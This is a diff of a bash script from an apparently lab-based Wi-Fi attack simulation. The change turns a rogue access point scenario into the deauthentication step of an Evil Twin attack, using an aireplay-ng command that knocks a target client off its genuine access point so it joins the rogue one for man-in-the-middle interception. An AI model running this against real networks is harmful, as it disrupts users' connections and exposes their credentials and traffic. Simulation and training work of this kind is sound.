@@ -23,35 +23,28 @@ print_none "Tool:          $SCN_TOOL"
 print_none "Mode:          $SCN_MODE"
 print_blank
 print_wrapped_indent "Objective: " \
-"This scenario simulates an attacker broadcasting a rogue access point with the same SSID and BSSID as a genuine Wi-Fi network in order to device client devices into associating with it.  The goal is to exploit auto-connect behaviour or signal preferences logic in client devices.
+"This script performs the deauthentication component of an Evil Twin attack. It assumes that a genuine AP and a rogue (Evil Twin) AP are already broadcasting on the same channel.
 
-Once connected, clients may transmit sensitive information such as:
-
-1. Clear text HTTP credentials
-2. DNS queries
-3. Session cookies
-4. Any unencrypted service traffic
-
-The scenario forms the basis for further exploration such as captive portal spoofing, man-in-the-middle attacks, or credential harvesting."
+The script sends spoofed deauthentication frames to a target client, forcing it to disconnect from the genuine AP. The client should then re-associate with the stronger Evil Twin AP, allowing for a Man-in-the-Middle position."
 print_line
 
 confirmation
 
 # ─── Show Requirements ───
 print_section "Requirements"
-print_none "1. Client device must have previously associated with AP: $SCN_SSID"
-print_none "2. Client device must have auto-connect enabled for SSID: $SCN_SSID"
-print_none "3. AP profile: $SCN_PROFILE must be offline"
+print_none "1. A genuine AP must be ONLINE (Target BSSID: $SCN_TARGET_BSSID)."
+print_none "2. An Evil Twin AP with the same SSID ($SCN_SSID) must be ONLINE on the same channel."
+print_none "3. A client device ($SCN_CLIENT_MAC) must be associated with the genuine AP."
 
 confirmation
 
 # ─── Show Capture Config ───
 print_section "Capture Preparation"
 print_none "Type:          $SCN_CAPTURE"
-print_none "BSSID:         $SCN_BSSID"
 print_none "Channel:       $SCN_CHANNEL"
 print_none "Duration:      $SCN_DURATION seconds"
 print_blank
+print_warning "IMPORTANT: Do NOT filter capture by BSSID. Both genuine and rogue AP traffic must be visible."
 print_action "Launch Capture"
 
 confirmation
@@ -60,32 +53,27 @@ confirmation
 clear
 print_section "Simulation"
 
-# ─── Start AP ───
-bash "$HELPERS_DIR/fn_start-ap.sh" t004
-START_EXIT_CODE=$?
-
-if [[ "$START_EXIT_CODE" -ne 0 ]]; then
-    print_fail "Access Point launch failed"
-    exit "$START_EXIT_CODE"
-else
-    print_success "Access Point launch successful"
-    print_info "Generating Traffic"
-    sudo timeout "$SCN_DURATION" bash "$HELPERS_DIR/fn_traffic.sh" t004
-    print_blank
-fi
-
-# ─── Stop AP ───
-print_info "Stopping Access Point"
-
-bash "$HELPERS_DIR/fn_stop-ap.sh"
-EXIT_CODE=$?
-
+# --- Prepare for Injection ---
+print_action "Switching interface $INTERFACE to monitor mode..."
+ensure_monitor_mode
+print_success "Interface is in monitor mode."
 print_blank
 
-if (( EXIT_CODE == 0 )); then
-    print_success "Simulation completed"
-else
-    print_fail "Simulation stopped (Code: $EXIT_CODE)"
-fi
+# --- Launch Forced Disconnect ---
+print_action "Sending deauthentication frames to client $SCN_CLIENT_MAC"
+print_none "Spoofing genuine AP BSSID: $SCN_TARGET_BSSID"
+sudo aireplay-ng --deauth 5 -a "$SCN_TARGET_BSSID" -c "$SCN_CLIENT_MAC" "$INTERFACE"
+print_success "Deauthentication frames sent."
+print_blank
+
+# --- Wait for Attack Duration ---
+print_info "Attack running. Waiting $SCN_DURATION seconds for capture..."
+sleep "$SCN_DURATION"
+print_blank
+
+# --- Cleanup ---
+print_action "Restoring interface to managed mode..."
+ensure_managed_mode
+print_success "Simulation completed."
 
 exit 0
